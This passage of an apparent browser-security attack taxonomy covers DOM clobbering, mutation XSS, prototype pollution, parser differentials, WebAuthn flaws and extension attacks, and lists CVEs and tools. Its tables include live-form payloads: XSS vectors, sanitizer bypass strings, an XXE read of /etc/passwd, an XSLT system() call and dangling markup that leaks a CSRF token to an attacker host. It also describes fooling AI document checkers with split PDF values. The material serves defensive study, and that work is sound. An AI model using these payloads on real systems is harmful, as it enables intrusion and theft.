| **HTMLCollection Clobbering** | Multiple elements with same id create HTMLCollection; accessing by name returns first element | Two <a id="config"> tags create HTMLCollection; config.scriptSrc accesses first element's attributes |
| **Clobbering for CSP Bypass** | Clobbering configuration objects used in script loading logic bypasses CSP | DOMPurify vulnerability: <form id="sanitizer"><input name="removed" value="<img src=x onerror=alert(1)>"> |
| **Clobbering for XSS** | Clobbering variables used in innerHTML/eval sinks enables XSS | <a id="userConfig"><a id="userConfig" name="htmlTemplate" href="cid:&quot;onerror=alert(1)//"> |

Khodayari & Pellegrino (IEEE S&P 2023, "It's (DOM) Clobbering Time") found that approximately 9.8% of top 5K websites are vulnerable to DOM clobbering, including major platforms like GitHub, Trello, and Wikibooks.

### §6-3. Mutation XSS (mXSS)

Mutation XSS exploits differences between how HTML sanitizers parse HTML strings and how browsers mutate the HTML during rendering.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Namespace Mutation** | HTML with mixed XML namespaces mutates during parsing | <form><math><mtext><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1)>"> mutates in DOMPurify (CVE-2024-47875) |
| **Backtick Attribute Mutation** | Backticks in attribute values mutate into quotes during rendering | <div title=`x`onload=alert(1)> mutates to <div title=x onload=alert(1)> in some contexts |
| **Mismatched Tag Mutation** | Browsers auto-close or rearrange mismatched tags differently than sanitizers | <noscript><p></noscript><img src=x onerror=alert(1)>> mutates when noscript rendered |
| **CSS Context Mutation** | CSS expressions or escape sequences mutate during style parsing | <style>*{xss:expression(alert(1))}</style> in IE or \\3c img src=x onerror=alert(1)\\3e  in attributes |
| **Foreign Content Mutation** | SVG or MathML foreign content mutates when moved to HTML context | <svg><a><animate attributeName=href values=javascript:alert(1)> mutates during rendering |
| **Template Element Mutation** | Content inside <template> parsed differently; mutation occurs when cloned | <template><div><table><template><img src=x onerror=alert(1)></template></table></div></template> |

DOMPurify, Google Caja, Mozilla Bleach, and lxml have all experienced mXSS bypasses. CVE-2024-47875 (DOMPurify 3.x) and CVE-2024-52595 (lxml_html_clean) demonstrate the ongoing difficulty of preventing mXSS.

### §6-4. Prototype Pollution

JavaScript prototype pollution occurs when attackers inject properties into Object.prototype, Array.prototype, or other built-in prototypes, affecting all objects.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Constructor Pollution** | Polluting Object.prototype via __proto__ or constructor.prototype | JSON.parse() or object merge with user input: obj[__proto__][isAdmin]=true |
| **Prototype Pollution to XSS** | Polluted properties flow into DOM XSS sinks | Pollute transport_url property; analytics library uses it in eval() sink |
| **Prototype Pollution to RCE** | In Node.js, polluted properties reach command execution sinks | Pollute shell or execPath properties in child_process functions |
| **Gadget Chain Exploitation** | Specific code patterns ("gadgets") in third-party libraries become exploitable when prototypes polluted | Google Analytics "sequence" property flows to eval if polluted; jQuery uses polluted properties in AJAX |
| **Prototype Pollution via Query String** | URL parameters like ?__proto__[admin]=true parsed into objects | Express query parser or qs library parses ?__proto__[x]=y into object path traversal |
| **DOM Clobbering + Prototype Pollution** | Combining DOM clobbering with prototype pollution for deeper exploitation | Clobber Object.prototype via <form id="__proto__"><input name="polluted" value="malicious"> |

DOMPurify ≤ 3.0.8 (CVE-2024-45801) suffered from prototype pollution where attackers could pollute Node.prototype.after before sanitization, bypassing SAFE_FOR_TEMPLATES and achieving stored XSS.

### §6-5. Trusted Types Bypasses

Trusted Types is a browser API that enforces type safety for dangerous DOM sinks, preventing DOM XSS. Bypasses circumvent this protection.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Legacy API Sink Usage** | Some deprecated APIs not covered by Trusted Types enforcement | document.writeln(), document.execCommand(), or other legacy methods |
| **Framework Bypass** | Framework uses internal methods that bypass Trusted Types checks | Angular, React, or Vue using internal DOM manipulation bypassing TrustedHTML |
| **Script Gadget Exploitation** | Trusted Types doesn't prevent exploitation of script gadgets (benign DOM elements triggering execution) | Polluting attributes on existing safe elements that trigger script execution |
| **Trusted Types Policy Bypass** | Custom Trusted Types policy with unsafe createPolicy() implementation | policy.createHTML() doesn't properly sanitize, allowing HTML injection |

While Trusted Types significantly reduces DOM XSS (Google reports near-elimination on 130 services), adoption remains low (14.2% of Chrome page views as of 2024) and legacy sinks remain unprotected.

---

## §7. Cross-Origin Isolation Bypasses

Cross-origin isolation (achieved via COOP, COEP, CORP) enables powerful features like SharedArrayBuffer while protecting against Spectre attacks. Bypasses reintroduce Spectre-class vulnerabilities.

### §7-1. COOP/COEP/CORP Misconfiguration

Cross-Origin-Opener-Policy (COOP), Cross-Origin-Embedder-Policy (COEP), and Cross-Origin-Resource-Policy (CORP) work together to isolate origins.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **COEP Credentialless Bypass** | COEP: credentialless allows loading cross-origin resources without CORP if credentials omitted | Attacker loads sensitive resources via <img> or fetch() without credentials; timing/error leaks reveal info |
| **CORP Missing on Sensitive Resources** | Sensitive API endpoints lack CORP header; COEP allows loading if CORS present | Cross-origin fetch() to API endpoint succeeds if CORS permissive but CORP missing |
| **COOP Popup Manipulation** | COOP: same-origin breaks window.opener reference but popup can still navigate opener | Popup from cross-origin can't read opener but can execute opener.location='//attacker.com' |
| **COOP Same-Origin-Allow-Popups Bypass** | COOP: same-origin-allow-popups preserves opener reference; attacker popup gains access | Main page uses COOP: same-origin-allow-popups; attacker-controlled popup retains window.opener |

Cross-origin isolation remains poorly adopted because it requires coordination across all embedded resources and breaks many legitimate use cases like third-party widgets.

### §7-2. Site Isolation and Spectre Bypasses

Site Isolation mitigates Spectre by putting different origins in separate processes. Bypasses enable cross-process memory leaks.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Spook.js Attack** | Transient side-channel attack measuring CPU execution time to leak data across Site Isolation | High-resolution timers (performance.now()) + speculative execution leak cross-origin data |
| **SharedArrayBuffer Timing** | SharedArrayBuffer + Web Workers create high-resolution timer for side-channel attacks | Cross-origin fetch() timing measured via SharedArrayBuffer reveals response content |
| **Safari Lack of Site Isolation** | Safari production releases lack full Site Isolation, remaining vulnerable to Spectre | Spectre attacks practical in Safari despite mitigations in Chrome/Firefox |

Site Isolation provides defense-in-depth but architecture-level vulnerabilities persist.

---

## §8. Parser and Encoding Bypasses

Differential parsing occurs when different components (browser, WAF, backend) interpret the same input differently. URL parser confusion, HTML parser differentials, character encoding bypasses, and XSLT/XML injection exploit these discrepancies.

### §8-1. URL Parser Confusion

URL parsing inconsistencies between components enable SSRF, authentication bypass, and access control bypass.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Scheme Confusion** | Missing or malformed scheme interpreted differently | Browser treats //example.com as relative but backend treats as absolute; or vice versa |
| **Slash Count Confusion** | Irregular number of slashes in scheme separator | http:///example.com or http://example.com parsed differently by different parsers |
| **Backslash vs Forward Slash** | Windows-style backslashes interpreted as forward slashes in some parsers | http://trusted.com\@evil.com parsed as evil.com by browser but trusted.com by validation |
| **@ Symbol Authority Confusion** | User info section with @ confuses host extraction | http://trusted.com@evil.com parsed as evil.com by browser but backend checks for trusted.com |
| **Port Confusion** | Port number parsing differences | http://example.com:8080@evil.com:80 or http://example.com:65536 parsed inconsistently |
| **IPv6 Address Confusion** | IPv6 brackets and notation parsed differently | http://[::1]:80/ vs http://[::1]/ vs http://0:0:0:0:0:0:0:1 interpreted differently |
| **URL Encoding Confusion** | Percent-encoding decoded at different stages | Browser decodes %2F (/) in path but WAF validates before decoding, allowing path traversal |
| **Unicode/IDN Homograph** | Internationalized domain names with confusable characters | http://аpple.com (Cyrillic 'а') vs http://apple.com (Latin 'a') |

CVE-2024-30043 (SharePoint XXE) exploited URL parsing confusion where XML parser interpreted URLs differently than the application's validation logic. CVE-2025-25292 (Ruby SAML) involved parser differentials in DOCTYPE handling, enabling authentication bypass.

The Python URL parsing vulnerability (CVE-2025-0938) accepted square brackets in domain names, creating differential behavior with spec-compliant parsers.

### §8-2. HTML Parser Differential

Browsers, sanitizers, and WAFs may parse the same HTML differently.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Tag Unclosure Exploitation** | Dangling markup: unclosed tag consumes following content into attribute | <img src='//attacker.com?leak= leaves tag open; browser includes CSRF token in URL |
| **Namespace Confusion** | Malformed or namespaced tags interpreted differently | <a:body onload=alert(1)> or <svg:script>alert(1)</svg:script> execute in some contexts |
| **Null Byte Injection** | Null bytes (\x00) terminate strings in C-based parsers but not JavaScript parsers | <img src="safe.jpg\x00.js" onerror=alert(1)> bypasses extension check |
| **Comment Parsing Differential** | Comment syntax interpreted differently | <!--[if mso]><script>alert(1)</script><![endif]--> executes in Outlook but sanitizers may allow |
| **Attribute Quote Confusion** | Backticks, missing quotes, or mixed quotes parsed differently | <img src=`javascript:alert(1)`> or <img src='x' onerror='alert(1)'> |
| **Entity Encoding Bypass** | HTML entities decoded at different stages | &lt;script&gt;alert(1)&lt;/script&gt; decoded after validation |

Dangling markup injection exfiltrates data without JavaScript execution, bypassing CSP. The technique was widespread until Chrome implemented mitigations preventing raw angle brackets and newlines in URLs (though bypass vectors continue to emerge).

### §8-3. Character Encoding Bypasses

Character encoding differences between components enable filter bypasses.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **UTF-7 Encoding** | UTF-7 encoding allows ASCII characters to represent scripts | +ADw-script+AD4-alert(1)+ADw-/script+AD4- encodes <script>alert(1)</script> |
| **UTF-8 Overlong Encoding** | Overlong UTF-8 sequences bypass filters | 0xC0 0xAE represents '.' in overlong encoding, bypassing path traversal filters |
| **UTF-16/UTF-32 Confusion** | Mixed character encodings processed inconsistently | Content-Type: text/html; charset=UTF-16BE with UTF-8 payload |
| **BOM (Byte Order Mark) Injection** | BOM characters alter encoding detection | 0xEF 0xBB 0xBF (UTF-8 BOM) at start of payload changes parsing |
| **Unicode Normalization Bypass** | Unicode normalization (NFC, NFD, NFKC, NFKD) creates equivalent but differently-encoded strings | Filter blocks NFC "ﬁle" but allows NFD decomposed "file" (U+FB01 vs U+0066 U+0069) |
| **Homoglyph Substitution** | Visually similar characters from different Unicode blocks | 'а' (Cyrillic) instead of 'a' (Latin) bypasses string matching |

### §8-4. XSLT and XML Injection

XSLT (Extensible Stylesheet Language Transformations) and XML processing create injection vectors.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **XSLT Code Execution** | XSLT stylesheets can execute arbitrary code via extension functions | <xsl:value-of select="php:function('system','whoami')"/> in PHP XSLT processor |
| **XSLT CSP Bypass** | XSLT documents can sidestep CSP restrictions (CVE-2025-8032 Firefox) | <?xml-stylesheet type="text/xsl" href="data:text/xml,<xsl:transform ...><script>alert(1)</script>"> |
| **XXE (XML External Entity)** | XML parser resolves external entities, enabling SSRF and file read | <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data> |
| **XML Namespace Injection** | Malicious namespaces alter XML interpretation | xmlns:a="http://www.w3.org/1999/xhtml" allows <a:script>alert(1)</a:script> |
| **XPath Injection** | Attacker-controlled XPath expressions query unauthorized data | //user[username='$input'] where $input is ' or '1'='1 returns all users |

Chromium officially deprecated XSLT (planned removal November 2026) due to persistent security issues and minimal legitimate usage. Firefox and WebKit plan similar deprecations.

### §8-5. PDF Rendering Discrepancies

PDF widget annotations are rendered inconsistently across browsers, enabling document content manipulation where different viewers display different values from the same file.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Widget Annotation Value Override** | PDF widget annotations contain both a default value (V) and an appearance stream; browsers disagree on which to display. Chrome and Google Drive render the widget annotation value, overriding defaults. Firefox similarly prioritizes the widget annotation over defaults. Safari and macOS Preview display only the form field default value, ignoring widget annotations entirely | Same PDF file viewed in different browsers or PDF readers |

The core issue is inconsistent PDF specification implementation across rendering engines. The PDF spec permits both default values and widget annotation values, but does not mandate which takes precedence when both are present, creating an ambiguity that each implementation resolves differently. This enables concrete attack scenarios: an attacker crafts a PDF with divergent default and widget annotation values (e.g., default "£399", annotation "£999") — a CEO reviewing in Safari sees £399 while accounting processing in Chrome sees £999, enabling invoice fraud from a single unmodified file. Additionally, AI systems (e.g., ChatGPT) lack annotation support and extract only default text values, creating an AI-human discrepancy exploitable for bypassing AI-assisted document verification.

---

## §9. Cross-Origin Communication Channel Bypasses

Modern browsers provide legitimate cross-origin communication channels (PostMessage, WebSocket, Service Workers, Fetch Metadata). Bypasses exploit insufficient validation in these channels.

### §9-1. PostMessage Injection (covered in §1-2)

See §1-2 for detailed PostMessage bypass techniques.

### §9-2. WebSocket Security Bypasses

WebSocket provides bidirectional communication but doesn't enforce SOP by default.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Cross-Site WebSocket Hijacking (CSWSH)** | WebSocket handshake doesn't validate Origin header; attacker establishes connection from malicious site | Server accepts WebSocket connection without checking Origin or using session cookies for auth |
| **WebSocket Authentication Bypass (CVE-2024-55591)** | Authentication bypass in FortiOS (7.0.0–7.0.16) / FortiProxy (7.0.0–7.0.19, 7.2.0–7.2.12) web management interface allows remote super-admin access via crafted WebSocket requests | Fortinet device with exposed management interface, CVSS 9.6 (actively exploited 2025) |
| **WebSocket Message Injection** | Attacker sends malicious messages to victim's WebSocket connection | WebSocket message handler doesn't validate message source or format |
| **WebSocket Smuggling** | Proxy and backend disagree on WebSocket handshake success; attacker smuggles HTTP requests through connection | Front-end proxy thinks handshake failed but backend accepts, keeping connection open for smuggled requests |
| **GraphQL over WebSocket CSWSH** | GraphQL APIs over WebSocket vulnerable to CSWSH, enabling arbitrary API calls (2025 research) | GraphQL subscriptions over WebSocket without origin validation; attacker deletes victim's account |

CVE-2024-55591 in FortiOS/FortiProxy represents one of the most critical WebSocket vulnerabilities (CVSS 9.6), with active exploitation in the wild allowing authentication bypass to super-admin privileges.

### §9-3. Service Worker Exploitation

Service Workers act as programmable network proxies with broad privileges. Compromised Service Workers enable persistent attacks.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Service Worker XSS (SW-XSS)** | XSS in Service Worker script enables persistent attack across all pages in scope | importScripts() loads attacker-controlled script; SW intercepts all fetches |
| **Service Worker Registration Takeover** | Attacker registers Service Worker before legitimate site establishes proper SW | Race condition or subdomain takeover allows attacker SW registration |
| **Service Worker Scope Expansion** | Service Worker registered with broader scope than intended, affecting unintended pages | SW registered at / instead of /app/, intercepting all site traffic |
| **Service Worker Cache Poisoning** | Attacker poisons SW cache with malicious responses served persistently | SW caches attacker's response; legitimate requests receive poisoned content |
| **Service Worker Persistence** | Once registered, SW persists until explicitly unregistered or data cleared | Attacker SW remains active for months/years, monitoring victim activity |

Research found SW-XSS vulnerabilities in 40 websites with over 100 million combined monthly visitors. Service Workers' lifecycle (background execution, persistence until manual clearing) makes them exceptionally dangerous for persistent attacks.

### §9-4. Fetch Metadata Bypass

Fetch Metadata headers (Sec-Fetch-Site, Sec-Fetch-Mode, Sec-Fetch-Dest, Sec-Fetch-User) enable servers to distinguish legitimate from cross-origin requests. Bypasses negate this protection.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **WebView Missing Sec-Fetch Headers** | Mobile WebView apps bypass browser-layer checks that populate Sec-Fetch headers | Native app uses loadUrl() directly; Sec-Fetch-* headers missing |
| **Client Hints Missing in WebView** | WebView overrides UA string; Client Hints (Sec-CH-UA-*) not sent | App-controlled UA string prevents automatic Client Hints generation |
| **Browser Inconsistency** | Different browsers send different Sec-Fetch values for same action | Firefox doesn't send Sec-Fetch-User on reload; Sec-Fetch-Dest randomly changes to "image" |
| **Sec-Fetch-Site Bypass via PaymentRequest** | PaymentRequest API can trigger requests without proper Sec-Fetch-Site header | Chromium bug allows PaymentRequest to send cross-origin request with incorrect Sec-Fetch-Site |

Fetch Metadata is described as "full of edge cases" by 2024 research, particularly in WebView contexts where many browser-layer checks don't apply. This creates blind spots in bot detection and CSRF protection.

---

## §10. Authentication and Credential Management Bypasses

Browser-level authentication mechanisms (WebAuthn/Passkeys, Credential Management API, password managers) provide security foundations. Bypasses enable account takeover and credential theft.

### §10-1. WebAuthn and Passkey Bypasses

WebAuthn (Web Authentication API) and passkeys provide phishing-resistant authentication. Implementation flaws create bypass vectors.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **WebAuthn API Hijacking** | Attacker hijacks WebAuthn API via XSS or malicious extension, forging registration and login (DEF CON 2025 SquareX research) | JavaScript injection overwrites navigator.credentials.create() and .get() methods |
| **Synced Passkey Downgrade** | Phishing proxy spoofs unsupported browser; Entra/IdP disables passkeys; user falls back to SMS/OTP (Proofpoint 2025) | Attacker spoofs old browser UA; victim offered weaker auth; proxy captures credentials and session cookie |
| **WebAuthn Logic Flaw Bypass** | Application trusts frontend challenge without backend verification | Attacker starts WebAuthn flow with victim's username, signs challenge with own passkey, gains access to victim account |
| **StrongKey FIDO Server Takeover (CVE-2025-26788)** | Non-discoverable credential flow allows starting auth with victim's username, signing with attacker's passkey | Backend doesn't verify credential belongs to claimed user; any valid signature accepted |
| **Chrome Bluetooth Passkey Bypass (CVE-2024-9956)** | Android Chrome initiates PassKey auth via Bluetooth without user interaction | Malicious webpage auto-triggers Bluetooth passkey request, capturing authentication credentials |
| **Phishing via Synchronized Passkey Fabric** | Attacker phishes credentials to synchronization service (Google Password Manager, iCloud Keychain); gains access to all passkeys | If attacker compromises iCloud/Google account, all synchronized passkeys accessible |

These vulnerabilities demonstrate the "WebAuthn Loop" phenomenon: technically phishing-resistant protocols undermined by implementation flaws. WebAuthn API hijacking requires XSS or malicious extensions but completely defeats passkey security. Downgrade attacks exploit IdP logic allowing fallback to weaker methods.

### §10-2. Credential Management API Exploitation

The Credential Management API enables websites to store and retrieve credentials. Misuse enables credential theft.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Hardcoded API Keys in Extensions** | Browser extensions contain hardcoded API keys, secrets, tokens in JavaScript source | Developers embed credentials directly in extension code; anyone can extract from .crx file |
| **Browser Credential Harvesting via DPAPI** | Chrome/Edge encrypt credentials with Windows DPAPI; malware decrypts using user's Windows session | Malware runs in user context, calls CryptUnprotectData() to decrypt browser-stored credentials |
| **Credential Leak via Extension API** | Malicious extension uses chrome.cookies or chrome.storage APIs to exfiltrate credentials | Extension requests cookies or storage permission; reads all stored credentials |
| **Password Manager Autofill Exploitation** | Password managers autofill credentials into hidden forms, enabling exfiltration | Attacker injects hidden <form> element; password manager autofills; JavaScript reads values |

Recent research found millions of Chrome extension users affected by hardcoded credential exposure. The shift toward browser credential storage makes browsers high-value targets, often receiving less defensive attention than traditional LSASS-based credential theft.

---

## §11. Extension and Component Security Bypasses

Browser extensions, supply chain, and browser components (rendering engine, JavaScript engine) present additional attack surfaces.

### §11-1. Malicious Browser Extension Attacks

Browser extensions have broad privileges and weak security boundaries.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Extension Repackaging and Obfuscation** | Malicious actor repackages legitimate extension with added malware; obfuscation bypasses automated review | Extensions use code obfuscation, delayed execution to evade Chrome Web Store / Mozilla Add-ons scanning |
| **Extension Permission Escalation** | Extension requests minimal permissions initially, then updates to request dangerous permissions | Users approve initial install with safe permissions; update requests host_permissions: ["<all_urls>"] |
| **Extension Supply Chain Compromise** | Legitimate extension developer account compromised; attacker uploads malicious version | Phishing attack against developer; TamperedChef campaign compromised 16 extensions affecting 3.2M users (2025) |
| **Manifest V3 Evasion** | Despite Manifest V3 restrictions, extensions use remote code loading, WebAssembly, or service workers for evasion | Extension loads remote script via fetch() + eval() or uses WASM blob |
| **Extension CSP Bypass (CVE-2025-9866)** | Chromium Extensions CSP bypass via crafted HTML page | Inappropriate implementation in Extensions code path allows bypass |

In December 2024, over 33 malicious Chrome extensions (2.6M+ users) harvested credentials for 18 months. In February 2025, TamperedChef compromised 16 extensions affecting 3.2M users. Despite Manifest V3, 2025 research successfully bypassed both Firefox and Chrome security mechanisms.

### §11-2. JavaScript Engine Vulnerabilities

JavaScript engine (V8, SpiderMonkey, JavaScriptCore) bugs enable arbitrary code execution.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **JIT Compiler Bugs** | Just-In-Time compiler optimization introduces incorrect assumptions, enabling type confusion | V8 JIT assumes integer range; overflow leads to OOB memory access |
| **Type Confusion** | JavaScript engine's type system bypassed, treating one type as another | Object expected to be Array but is Function; accessing properties leads to RCE |
| **Use-After-Free** | Memory freed but pointer still used, enabling arbitrary memory read/write | Garbage collector frees object while reference still exists |
| **ArrayBuffer/TypedArray Exploitation** | Incorrect bounds checking on ArrayBuffer or TypedArray | Out-of-bounds write in Uint32Array overwrites adjacent memory |

Chrome reported over 50 high-severity and critical vulnerabilities in 2024, including actively exploited zero-days like CVE-2024-7971 and CVE-2024-7965. Differential fuzzing tools like JIT-Picker (2024) discovered 32 previously unknown bugs in JavaScript engines, earning a $10,000 Mozilla bug bounty.

### §11-3. Supply Chain and Dependency Attacks

Third-party dependencies introduce vulnerabilities into web applications.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Compromised CDN** | Attacker compromises CDN serving JavaScript libraries; malicious code served to all dependent sites | Polyfill.io compromise (2024) injected malware into 100K+ websites |
| **Vulnerable Library Version** | Application uses outdated library with known vulnerabilities | jQuery < 3.5.0 with prototype pollution; DOMPurify < 3.1.3 with mXSS bypass |
| **Typosquatting** | Attacker publishes malicious package with name similar to popular library | npm package "cross-env-malware" instead of "cross-env" |
| **Dependency Confusion** | Attacker publishes public package with same name as internal private package; package manager installs public version | Internal package @company/auth; attacker publishes public @company/auth with higher version |

---

> **Cross-reference**: HTTP/2 and HTTP/3 protocol-layer attacks (request smuggling, CONTINUATION flood, H2 Rapid Reset, QUIC smuggling) are covered in [http-request-smuggling.md](../03-http-protocol/http-parsing-discrepancy/http-request-smuggling.md) and [http3-quic-protocol-smuggling.md](../03-http-protocol/http-parsing-discrepancy/http3-quic-protocol-smuggling.md). Browser-specific authority confusion attacks (CrossPUSH, CrossSXG — Tsinghua University 2024) are noted under §1 SOP Bypass.

---

## Attack Scenario Mapping (Axis 3)

This table maps primary attack scenarios to the Security Mechanism categories where they're most commonly exploited.

| Scenario | Architecture | Primary Mutation Categories |
|----------|-------------|---------------------------|
| **Cross-Site Scripting (XSS)** | Client-side script execution in victim context | §2 (CSP Bypass) + §6 (DOM Isolation) + §8 (Parser Differentials) |
| **Information Leakage** | Cross-origin data exfiltration | §1 (SOP Bypass) + §3 (Cookie Theft) + §7 (Cross-Origin Isolation) + §9 (PostMessage/WebSocket) |
| **Document Content Manipulation** | Same document renders differently across viewers | §8 (PDF Rendering Discrepancies) |
| **Authentication Bypass** | Circumventing login mechanisms | §3 (Cookie Security) + §5 (Transport Security) + §10 (WebAuthn/Credential Management) |
| **Account Takeover** | Complete compromise of user account | §1 (CORS) + §3 (Cookies) + §6 (Prototype Pollution) + §10 (Passkey Bypass) |
| **CSRF (Cross-Site Request Forgery)** | Unauthorized state-changing actions | §3 (SameSite Bypass) + §9 (WebSocket Hijacking) |
| **Cache Poisoning** | Poisoning shared caches to affect multiple users | §1 (CORS) + §8 (Parser Confusion) |
| **Clickjacking** | UI redressing attacks | §4 (Frame Protection Bypass) + §4 (Sandbox Escape) |
| **Man-in-the-Middle (MITM)** | Interception and modification of traffic | §5 (HSTS Bypass) + §5 (Certificate Validation) + §5 (Mixed Content) |
| **Denial of Service (DoS)** | Resource exhaustion or crash | §3 (Cookie Bomb) + §9 (Service Worker) |
| **Privilege Escalation** | Gaining elevated permissions | §6 (Prototype Pollution) + §10 (WebAuthn Logic Flaws) + §11 (Extension Permissions) |
| **Supply Chain Compromise** | Compromising through dependencies/extensions | §11 (Extension Supply Chain) + §11 (Compromised CDN) |
| **Persistent Attack** | Long-term compromise outlasting single session | §9 (Service Worker Persistence) + §11 (Malicious Extensions) |

---

## CVE / Bounty Mapping (2024-2025)

| Mutation Combination | CVE / Case | Impact / Bounty |
|---------------------|-----------|----------------|
| §2-4 + §6-3 | CVE-2024-47875 (DOMPurify) | Mutation XSS enabling CSP bypass and stored XSS via nested HTML elements |
| §10-1 | CVE-2024-49038 (Microsoft Copilot Studio) | CVSS 9.3. PostMessage authentication bypass enabling cross-tenant data exfiltration |
| §9-2 | CVE-2024-55591 / CVE-2025-24472 (FortiOS/FortiProxy) | CVSS 9.6. Authentication bypass in Fortinet management interface via WebSocket, granting super-admin privileges. Actively exploited in wild |
| §2-1 + §2-5 | CVE-2025-9866 (Chromium Extensions) | CSP bypass via crafted HTML page in Extensions implementation |
| §1-1 | CVE-2025-8036 (Firefox 141) | CORS preflight responses cached across IP changes, bypassing origin checks |
| §2-2 + §2-4 | CVE-2025-8032 (Firefox 141) | XSLT documents sidestep CSP restrictions |
| §4-2 | CVE-2024-5691 (Firefox) | Iframe sandbox bypass via clickjacking on native XFO error page |
| §8-1 | CVE-2024-30043 (SharePoint) | URL parsing confusion enabling XXE injection. Authentication bypass and RCE |
| §8-1 | CVE-2025-25292 / CVE-2025-25291 (ruby-saml) | Parser differential in namespace/DOCTYPE handling enabling SAML authentication bypass |
| §8-1 | CVE-2025-0938 (CPython) | URL parsing in `urllib.parse` accepts square brackets in domain names, creating parser differential |
| §10-1 | CVE-2025-26788 (StrongKey FIDO Server 4.10.0-4.15.0) | Account takeover of any registered user due to WebAuthn non-discoverable credential flow flaw |
| §10-1 | CVE-2024-9956 (Google Chrome Android) | Chrome Bluetooth initiates PassKey authentication without user interaction, enabling credential capture |
| §6-4 | CVE-2024-45801 (DOMPurify ≤ 3.0.8) | Prototype pollution bypassing SAFE_FOR_TEMPLATES profile, leading to stored XSS |
| §11-1 | Cyberhaven Chrome Extension Compromise (Dec 2024) | Supply chain attack via phishing; harvested OAuth tokens from Google Workspace, Slack, Jira |
| §11-1 | TamperedChef Campaign (Feb 2025) | 16 Chrome extensions compromised affecting 3.2M users; credential harvesting |
| §1 | HTTP/2 CrossPUSH / CrossSXG (Tsinghua 2024) | SOP bypass affecting 11/14 browsers including Chrome, Edge, Instagram, WeChat. Arbitrary XSS |
| — | HTTP/2 CONTINUATION Flood (Bartek Nowotarski Jan 2024) | DoS via unlimited CONTINUATION frames causing OOM crash. Multiple vendors affected |
| §6-2 | Google VRP (DOM Clobbering) | $500 bounty for DOM clobbering via 0.CL desync using early response gadgets |
| §10-1 | WebAuthn API Hijacking (SquareX DEF CON 2025) | Passkey login bypass via API hijacking through XSS/malicious extension |
| §10-1 | Synced Passkey Downgrade (Proofpoint 2025) | Entra ID phishing proxy spoofs unsupported browser; user downgrades to SMS/OTP |
| §9-3 | Service Worker XSS (2024 Research) | 40 websites with 100M+ monthly visitors vulnerable to persistent SW-XSS |
| §2-1 | CVE-2018-5175 (Firefox) | Universal CSP `strict-dynamic` bypass via `data:` URI — `data:` URIs were exempt from nonce requirement under `strict-dynamic`, allowing script execution without a valid nonce |

---

## Detection Tools

| Tool | Target Scope | Core Technique |
|------|-------------|---------------|
| **Burp Suite Professional** (Offensive) | Comprehensive web app security testing | Intercepting proxy, Intruder, Repeater, Scanner (automated vuln detection), extensions marketplace |
| **OWASP ZAP** (Offensive) | Free web app scanner | Intercepting proxy, active/passive scanning, fuzzing, API support, automation-friendly |
| **DOM Invader** (Offensive) | Browser-based DOM XSS testing | Tests web messages, prototype pollution, DOM clobbering, XSS sinks. Integrated with Burp |
| **CSP Evaluator** (Defensive) | CSP policy analysis | Identifies unsafe directives, JSONP endpoints on whitelisted domains, policy bypasses |
| **JSONPeek + CSP B Gone** (Offensive) | JSONP endpoint discovery for CSP bypass | Scans for JSONP endpoints on whitelisted domains; automates CSP bypass via JSONP |
| **HTTP Garden** (Research) | HTTP request smuggling differential testing | Tests parser inconsistencies across web servers for smuggling vulnerabilities |
| **Browser Fuzzing Tools** (Research) | JavaScript engine, HTML parser, API fuzzing | JIT-Picker (JS engine), WebGlitch (WebGPU), domato (DOM fuzzing) |
| **Can I Use / MDN Browser Compat Data** (Defensive) | Browser feature compatibility tracking | Identifies which security features supported across browsers |
| **CORS Scanner** (Offensive) | CORS misconfiguration detection | Tests for wildcard + credentials, null origin reflection, domain matching weaknesses |
| **Retire.js** (Defensive) | JavaScript library vulnerability detection | Scans for outdated libraries with known vulnerabilities |
| **DOMPurify** (Defensive) | HTML sanitization preventing XSS | Client-side sanitizer preventing DOM XSS, mXSS (though itself has bypass history) |
| **Trusted Types** (Defensive) | DOM XSS sink protection | Browser API enforcing type safety for dangerous sinks (innerHTML, eval, etc.) |
| **Chrome DevTools Security Panel** (Defensive) | Browser-native security auditing | Identifies mixed content, insecure origins, certificate issues |
| **Lighthouse Security Audits** (Defensive) | Automated best practice checking | Checks for CSP, HTTPS, secure cookies, vulnerable libraries |
| **Nuclei** (Offensive) | Template-based vulnerability scanning | YAML-based templates for CORS, CSP, cookie misconfigurations, known CVEs |
| **SubFinder + HTTPX + Nuclei** (Offensive) | Subdomain enumeration → vulnerability detection pipeline | Automated pipeline for discovering subdomains and testing for browser security bypasses |
| **OWASP Dependency-Check** (Defensive) | Supply chain vulnerability detection | Scans project dependencies for known CVEs in libraries |
| **Mozilla Observatory** (Defensive) | Website security analysis | Tests CSP, cookies, HSTS, subresource integrity, referrer policy |
| **DiffCSP** (Research) | CSP enforcement differential testing | Generates 25K+ adversarial HTML instances × 1K+ CSPs; executes across 8 browsers (3 desktop + 5 mobile); decision-tree analysis compresses 19M execution results into ~1K analyzable paths. Found 37 bugs (29 security) in Chrome/Firefox/Safari; 12 patched; $4K bounty. NDSS 2023 |

---

## Summary: Core Principles

